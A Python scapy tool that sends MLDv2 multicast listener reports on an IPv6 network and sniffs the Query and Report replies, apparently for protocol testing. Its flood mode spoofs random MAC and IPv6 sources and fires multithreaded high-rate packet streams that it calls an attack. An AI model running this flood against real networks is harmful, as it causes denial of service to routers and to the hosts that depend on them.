#!/usr/bin/env python3
import argparse
import logging
import multiprocessing
import random
import re
import sys
import threading
from collections import Counter
from time import sleep

import netifaces
import netifaces as ni
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, IPv6ExtHdrHopByHop, RouterAlert, ICMPv6MLQuery2, ICMPv6MLDMultAddrRec, \
    ICMPv6MLReport2
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, sniff
from validate_parameters import is_valid_ipv6, is_valid_num, convert_mld, convert_flag
from validate_parameters import is_valid_mac
from validate_parameters import mac2ipv6


def parameter():
    parser = argparse.ArgumentParser(
        description="|> Sending several types of MLDv2 Report messages such as INCLUDE (insert 1), "
                    "EXCLUDE (insert 2), CHANGE_TO_INCLUDE (insert 3), CHANGE_TO_EXCLUDE (insert 4), "
                    "ALLOW_NEW_SOURCES (insert 5) and BLOCK_OLD_SOURCES (insert 6). Option to flood is also included. "
                    "The format to insert the Multicast Address Record is shown as this example:\n -lmar "
                    "\"rtype=1;mip=ff08::db8;src=[2001::1,2002::3]\". If the source is "
                    "not present in the record, just type src=[]. If user wants to add multiple Multicast Address "
                    "Records, just insert: -lmar record1 record2 record3 ...(separated by space).")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping).")
    parser.add_argument("-dmac", dest="destination_mac", action="store",
                        help="the MAC address of receiver (resolved from the interface if skipping).")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping).")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::16"
                                                                            " if skipping).")
    parser.add_argument("-lmar", dest="lmar", nargs="+", type=str,
                        help="the list of Multicast Address Records. Each record comprises of record type (rtype); "
                             "multicast address (mip); and sources (src).")
    parser.add_argument("-n", dest="num_packets", action="store", type=int, default=1,
                        help="the number of packets to send (1 if skipping).")
    parser.add_argument("-p", dest="period", action="store", type=int,
                        help="send the MLDv2 Report periodically every specified seconds.")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending MLDv2 Report messages using only the defined "
                             "source addresses (constant), or sending MLDv2 Report messages with many random source "
                             "addresses (random).")
    args = parser.parse_args()

    # Increase the recursion limit when calling Python objects (used when lots of Extension headers - > 300 headers)
    sys.setrecursionlimit(10 ** 6)

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        length = len(ni.ifaddresses(args.interface)[ni.AF_INET6])
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][length - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::16"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination MAC address
    if args.destination_mac is not None:
        if not is_valid_mac(args.destination_mac):
            print("---> The given destination MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Define the regular expression pattern for the input string and MAR
    pattern = r'^rtype=\w+;mip=\S+;src=\[.*?\]$'

    list_rtype = []
    list_mip = []
    list_src = []
    if args.lmar is not None:
        for input_str in args.lmar:
            # Validate the input string against the pattern
            if not re.match(pattern, input_str):
                print("---> Invalid input format of Multicast Address Record. Expected format: -lmar "
                      "'rtype=record_type;mip=multicast_address;src=[source1,source2,...]'")
                sys.exit(1)

            # Parse the values from the input string
            values = input_str.split(";")
            rtype = values[0].split("=")[1]
            mip = values[1].split("=")[1]
            src = values[2].split("=")[1].strip("[]").split(",")

            flag = False
            # Validate the Record type
            if not int(rtype):
                print("---> The record type is invalid. Try again!!!")
                flag = True
            if int(rtype):
                if int(rtype) < 1 or int(rtype) > 6:
                    print("---> The record type is invalid. Try again!!!")
                    flag = True

            # Validate the multicast address
            if not is_valid_ipv6(mip):
                print("---> The multicast IPv6 address is invalid. Try again!!!")
                flag = True

            # Validate the sources
            if src != ['']:
                for i in range(len(src)):
                    if not is_valid_ipv6(src[i]):
                        print("---> The given source is invalid. Try again!!!")
                        flag = True
            else:
                src = []

            if flag:
                sys.exit(1)

            list_rtype.append(int(rtype))
            list_mip.append(mip)
            list_src.append(src)

    # Validate the number of packets
    if args.num_packets is None:
        args.num_packets = 1
    if args.num_packets is not None:
        if not is_valid_num(args.num_packets):
            print("---> The given number of packets is invalid. Try again!!!")
            sys.exit(1)

    # Validate the period and flood
    if args.period is not None and args.flood is not None:
        print("---> Only one of two options (periodical sending, flooding) can exist. Try again!!!")
        sys.exit(1)
    if args.period is not None:
        if not is_valid_num(args.period):
            print("---> The given number of period is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    return args.interface, args.source_mac, args.destination_mac, args.source_ip, args.destination_ip, list_rtype, list_mip, list_src, args.num_packets, args.period, args.flood


def generate(interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood):
    # Generate packet
    if destination_mac is None:
        layer2 = Ether(src=source_mac)
    if destination_mac is not None:
        layer2 = Ether(src=source_mac, dst=destination_mac)
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
    HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))

    # Generate the Multicast Address Record
    if not list_rtype and not list_mip and not list_src:
        # MAR = ICMPv6MLDMultAddrRec(rtype=type, dst=multicast_ip, sources=[])
        MLD = ICMPv6MLReport2(type=143, records_number=0)
    else:
        list_mar = []
        for i in range(len(list_rtype)):
            MAR = ICMPv6MLDMultAddrRec(rtype=list_rtype[i], dst=list_mip[i], sources=list_src[i])
            list_mar.append(MAR)
        MLD = ICMPv6MLReport2(type=143, records_number=len(list_rtype), records=list_mar)
    packet1 = layer2 / layer3 / HBH / MLD

    if period is None and flood is None:
        print("Sending MLDv2 Report to destination: " + destination_ip)
        sendp(packet1 * num_packets, verbose=False, iface=interface)
    if period is not None:
        print("Sending MLDv2 Report every " + str(period) + "(s) to destination: " + destination_ip)
        pkts_list = []
        for i in range(num_packets):
            pkts_list.append(packet1)
        while True:
            try:
                sendp(packet1, verbose=False, iface=interface, count=num_packets)
                sleep(period-0.05)
            except KeyboardInterrupt:
                break

    if flood is not None:
        pkt_list = []
        print("Flooding the destination: " + destination_ip + " with MLDv2 Report messages (press Ctrl+C to "
                                                              "stop the attack).....")
        if flood == 'constant':
            for i in range(100):
                pkt_list.append(packet1)

        if flood == 'random':
            for i in range(50):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                source_ip = mac2ipv6(random_mac)
                layer2 = Ether(src=random_mac, dst="33:33:00:00:00:16")
                layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
                HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))

                list_mar = []
                for j in range(20):
                    M = 16 ** 4
                    mip = "ff0d::" + ":".join(("%x" % random.randint(0, M) for k in range(2)))
                    list_src = []
                    for l in range(1):
                        src = "2001:dead:" + ":".join(("%x" % random.randint(0, M) for m in range(6)))
                        list_src.append(src)
                    MAR = ICMPv6MLDMultAddrRec(rtype=random.randint(1, 6), dst=mip, sources=list_src)
                    list_mar.append(MAR)
                MLD = ICMPv6MLReport2(type=143, records=list_mar)
                packet1 = layer2 / layer3 / HBH / MLD
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(5):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, source_ip, destination_ip, list_rtype, list_mip, list_src):
    # Define our Custom Action function
    packet_counts = Counter()
    length = len(ni.ifaddresses(interface)[ni.AF_INET6])
    source_ip = ni.ifaddresses(interface)[ni.AF_INET6][length - 1]['addr']
    source_ip = source_ip.replace("%", '')
    source_ip = source_ip.replace(interface, '')

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if source_ip != packet[0][1].src:
            if ICMPv6MLQuery2 in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLDv2 Query message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     Maximum Response Code: " + str(packet[0].mrd) + ", Suppress Router-Side Processing: " + convert_flag(packet[0].S))
                print("     Querier's Robustness Variable: " + str(packet[0].QRV) + ", and Querier's query interval code: " + str(packet[0].QQIC))
                print("     to the multicast address " + packet[0].mladdr + ", and sources: " + str(packet[0].sources))
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLReport2 in packet:
                flag = False
                for i in range(packet[0].records_number):
                    if packet[0][ICMPv6MLDMultAddrRec].dst in list_mip:
                        flag = True
                if flag:
                    key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                    packet_counts.update([key])
                    print("+ Received MLDv2 Report message number #" + str(sum(packet_counts.values())))
                    print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                    for i in range(packet[0][ICMPv6MLReport2].records_number):
                        print("       Record number " + str(i + 1) + ": " + convert_mld(
                            packet[0][ICMPv6MLDMultAddrRec][i].rtype) + " and multicast address: " +
                              packet[0][ICMPv6MLDMultAddrRec][i].dst)
                        print("               Sources: " + str(packet[0][ICMPv6MLDMultAddrRec][i].sources))
                    print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=2.5)
    except KeyboardInterrupt:
        sys.exit(0)


def sniffing_forever(interface, source_ip, destination_ip, list_rtype, list_mip, list_src):
    # Define our Custom Action function
    packet_counts = Counter()
    length = len(ni.ifaddresses(interface)[ni.AF_INET6])
    source_ip = ni.ifaddresses(interface)[ni.AF_INET6][length - 1]['addr']
    source_ip = source_ip.replace("%", '')
    source_ip = source_ip.replace(interface, '')

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if source_ip != packet[0][1].src:
            if ICMPv6MLQuery2 in packet:
                key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                packet_counts.update([key])
                print("+ Received MLDv2 Query message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                print("     Maximum Response Code: " + str(
                    packet[0].mrd) + ", Suppress Router-Side Processing: " + convert_flag(packet[0].S))
                print("     Querier's Robustness Variable: " + str(
                    packet[0].QRV) + ", and Querier's query interval code: " + str(packet[0].QQIC))
                print("-----------------------------------------------------------------------------------")
            if ICMPv6MLReport2 in packet:
                flag = False
                for i in range(packet[0].records_number):
                    if packet[0][ICMPv6MLDMultAddrRec].dst in list_mip:
                        flag = True
                if flag:
                    key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
                    packet_counts.update([key])
                    print("+ Received MLDv2 Report message number #" + str(sum(packet_counts.values())))
                    print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                    for i in range(packet[0][ICMPv6MLReport2].records_number):
                        print("       Record number " + str(i + 1) + ": " + convert_mld(
                            packet[0][ICMPv6MLDMultAddrRec][i].rtype) + " and multicast address: " +
                              packet[0][ICMPv6MLDMultAddrRec][i].dst)
                        print("               Sources: " + str(packet[0][ICMPv6MLDMultAddrRec][i].sources))
                    print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action)
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood):
    p1 = multiprocessing.Process(target=generate,
                                 args=[interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, source_ip, destination_ip, list_rtype, list_mip, list_src])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


def execute_functions_forever(interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood):
    p1 = multiprocessing.Process(target=generate,
                                 args=[interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood])
    p2 = multiprocessing.Process(target=sniffing_forever, args=[interface, source_ip, destination_ip, list_rtype, list_mip, list_src])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood = parameter()
    if flood is None and period is None:
        try:
            execute_functions(interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    elif period is not None:
        try:
            execute_functions_forever(interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, source_mac, destination_mac, source_ip, destination_ip, list_rtype, list_mip, list_src, num_packets, period, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)
